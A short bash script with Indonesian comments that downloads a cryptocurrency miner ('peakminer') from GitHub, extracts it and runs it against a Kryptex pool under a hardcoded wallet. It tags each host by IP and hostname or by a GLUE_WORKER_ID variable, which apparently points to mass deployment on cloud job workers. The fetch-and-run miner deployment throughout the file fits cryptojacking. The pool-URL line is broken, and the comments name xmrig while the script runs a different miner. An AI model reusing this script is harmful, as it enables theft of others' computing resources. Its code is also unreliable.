#!/usr/bin/env bash
set -euo pipefail

# Fungsi untuk menjalankan perintah, menampilkan output atau stderr dan keluar jika gagal
run_cmd() {
  local cmd="$1"
  echo "Menjalankan perintah: $cmd"
  local output
  output=$(bash -c "$cmd" 2>&1) || { echo "STDERR:"; echo "$output"; exit 1; }
  if [[ -n "${output}" ]]; then
    echo "STDOUT:"
    echo "${output}"
  fi
}

# 1) Dapatkan worker name dari env GLUE_WORKER_ID atau bentuk "IP-hostname"
worker_name="${GLUE_WORKER_ID:-}"

if [[ -z "${worker_name}" ]]; then
  # Cari IP lokal pertama (privat) dengan beberapa fallback
  ip_addr=""

  # 1) hostname -I (Linux)
  if command -v hostname >/dev/null 2>&1; then
    ip_addr="$(hostname -I 2>/dev/null | awk '{print $1}' || true)"
  fi

  # 2) ip route get (works on many systems)
  if [[ -z "${ip_addr}" ]] && command -v ip >/dev/null 2>&1; then
    ip_addr="$(ip route get 1.1.1.1 2>/dev/null | awk '/src/ {print $NF; exit}' || true)"
  fi

  # 3) ifconfig (older systems)
  if [[ -z "${ip_addr}" ]] && command -v ifconfig >/dev/null 2>&1; then
    ip_addr="$(ifconfig 2>/dev/null | awk '/inet / && $2 != \"127.0.0.1\" {print $2; exit}' || true)"
  fi

  # 4) fallback ke unknown jika tidak ditemukan
  if [[ -z "${ip_addr}" ]]; then
    ip_addr="unknown-ip"
  fi

  # Ambil hostname pendek
  if command -v hostname >/dev/null 2>&1; then
    host_short="$(hostname | cut -d. -f1)"
  else
    host_short="unknown-host"
  fi

  # Ganti titik di IP menjadi dash untuk membentuk worker name yang aman
  ip_sanitized="${ip_addr//./-}"

  # Jika ip adalah unknown-ip -> gunakan hanya hostname
  if [[ "${ip_sanitized}" == "unknown-ip" ]]; then
    worker_name="${host_short}"
  else
    worker_name="${ip_sanitized}-${host_short}"
  fi
fi

echo "Nama Worker yang digunakan: ${worker_name}"

# 2) Unduh file xmrig.tar.gz
run_cmd "curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-19-1/peakminer-2.19.1.tar.gz"

# 3) Ekstrak arsip
run_cmd "tar -xvf peakminer-2.19.1.tar.gz"

# 4) Menjalankan xmrig dengan worker name yang disisipkan ke alamat wallet
wallet="86shoUZ9jrrWqKbLyNzzXWKYxLo6y3xdkbGmruh1fUyJSBi4j1a1EA6brvqMMkx8pffTzUmSiiKCwCr41LVn9oGM2Z2NkAk"
worker_tag="${wallet}/${worker_name}"
url="${stratum+tcp://prl.kryptex.network:7048}"

echo "Menjalankan xmrig dengan worker: ${worker_tag}"
echo "Menjalankan perintah: ./peakminer --coin pearl -o "${url}" -u ${worker_tag}"

# Ganti proses shell dengan xmrig (output akan tampil langsung). Jika xmrig keluar dengan kode != 0, skrip akan ikut keluar.
exec ./peakminer --coin pearl -o "${url}" -u "${worker_tag}"
